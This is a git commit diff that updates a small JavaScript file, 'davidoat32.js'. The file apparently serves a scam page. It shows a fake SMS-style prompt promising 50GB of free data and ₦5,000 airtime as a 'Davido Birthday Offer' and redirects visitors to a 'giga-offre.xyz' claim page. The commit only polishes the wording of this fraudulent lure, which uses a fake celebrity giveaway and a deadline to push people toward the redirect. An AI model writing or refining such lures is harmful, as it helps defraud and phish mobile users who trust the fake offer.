0071bedb9028217d5bb1df9c980f6ee84ade90ed
bigetijazz5 <bigetijazz5@gmail.com>
2024-11-04 11:58:16 -0800

    Update davidoat32.js

--- davidoat32.js
+++ davidoat32.js
@@ -1,6 +1,6 @@
 
 var password = 'CLAIM 50GB + AIRTIME '
-password=prompt('SMS: Hello, Claim your 50GB free data + ₦5,000 airtime Gift from Davido Birthday Offer Ending November 21. Press Ok to Claim now','CLAIM 50GB + AIRTIME');
+password=prompt('SMS: Hello, Claim your 50GB free data + ₦5,000 airtime Gift from Davido Birthday Offer Ends November 21. Press Ok to Claim now','CLAIM 50GB + AIRTIME');
 if (password != 'CLAIM 50GB + AIRTIME') {
 location.href='https://www.giga-offre.xyz/claim-now';
 }
